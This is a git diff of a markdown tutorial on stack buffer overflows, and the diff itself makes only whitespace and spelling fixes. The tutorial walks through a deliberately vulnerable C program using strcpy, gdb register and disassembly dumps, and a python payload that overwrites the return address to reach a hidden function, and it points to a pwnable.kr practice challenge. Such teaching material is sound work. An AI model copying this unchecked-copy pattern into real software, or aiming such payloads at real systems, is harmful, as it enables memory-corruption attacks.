@@ -1,6 +1,6 @@
 # bof
 
-<strong>Buffer overflow</strong> is one of the most common software vulnerability. It happens when we write more data that should be stored in a buffer. 
+<strong>Buffer overflow</strong> is one of the most common software vulnerabilities. It happens when we write more data that should be stored in a buffer.
 
 <p>Let's see one example about it:</p>
 
@@ -14,14 +14,14 @@ void secret() {
 
 void function(const char* input) {
     char data[10];
-    
+
     strcpy(data, input);
-    
+
     if (!strcmp(data, "something")) { // " " -> any value until 10 bytes
         printf("normal stuff\n");
     } else {
         printf("Try again\n");
-    } 
+    }
 }
 
 int main (int argc, const char* argv[]) {
@@ -31,8 +31,8 @@ int main (int argc, const char* argv[]) {
     } else {
         printf("You need at least one argument\n");
     }
-    
-    return 0; 
+
+    return 0;
 }
 ```
 
@@ -41,14 +41,14 @@ int main (int argc, const char* argv[]) {
 <p>Running the code:</p>
 
 ```
-gcc -m32 overflow.c -o overflow 
+gcc -m32 overflow.c -o overflow
 ./overflow AAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 <p>The result is:</p>
 
 ```
-Try again. 
+Try again.
 *** stack smashing detected ***: <unknown> terminated
 Aborted (core dumped)
 ```
@@ -105,7 +105,7 @@ ebx         0x41414141      1094795585
 esp         0xffffd100      0xffffd100
 ebp         0x41414141      0x41414141
 esi         0xf7fb6000      -134520832
-edi         0x0      0      
+edi         0x0      0
 eip         0x41414141      0x41414141
 eflags      0x10282  [ SF UF RF ]
 cs          0x23     35
@@ -120,11 +120,11 @@ gs          0x63     99
 
 ```
 (gdb) disas main
-``` 
+```
 
 <p>I get this result:</p>
 
-``` 
+```
 Dump of assembler code for function main:
    0x56555612 <+0>:     lea     0x4(%esp),%ecx
    0x56555616 <+4>:     and     $0xfffffff0,%esp
@@ -161,7 +161,7 @@ Dump of assembler code for function main:
    0x56555667 <+85>:    lea     -0x4(%ecx),%esp
    0x5655566a <+88>:    ret
 End of assembler dump.
-``` 
+```
 
 <p>As we see, the main function calls the function called "function" in +44.</p>
 
@@ -171,11 +171,11 @@ End of assembler dump.
 
 <p>We're going to explore more about it:</p>
 
-``` 
+```
 (gdb) disas secret
-``` 
+```
 
-``` 
+```
 Dump of assembler code for function secret:
    0x5655557d <+0>:     push    %ebp
    0x5655557e <+1>:     mov     %ebp,%esp
@@ -194,21 +194,21 @@ Dump of assembler code for function secret:
    0x565555a6 <+41>:    leave
    0x565555a7 <+42>:    ret
 End of assembler dump.
-``` 
+```
 
 <p>The secret adress is <strong>0x5655557d +0</strong>. How I know this? Just because it is the first instruction in the function. In addition, if I do more tests like using AAAAAAAAAAAAAAAAAAAAAABBBB, the eip changes to 0x42424242. So after 22 bytes (22 times A) we have the saved value of the return function, so let's put 0x5655557d on it.</p>
 
 ```
 (gdb) run $(python -c 'print "A" * 22 + "\x7d\x55\x55\x56"')
-``` 
+```
 
-``` 
+```
 Try again.
 You shouldnt be here
 
 Program received signal SIGSEGV, Segmentation fault.
 0xffffd300 in ?? ()
-``` 
+```
 
 <p>As we can see, we got it! We can have access inside of a function that it's not called!</p>
 
@@ -218,7 +218,7 @@ Program received signal SIGSEGV, Segmentation fault.
     <li> http://pwnable.kr/bin/bof.c</li>
 </ul>
 
-``` 
+```
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -237,7 +237,7 @@ int main(int argc, char* argv[]){
 	func(0xdeadbeef);
 	return 0;
 }
-``` 
+```
 
 <p>Also, we have this infomartion: <strong>Running at : nc pwnable.kr 9000</strong></p>
 
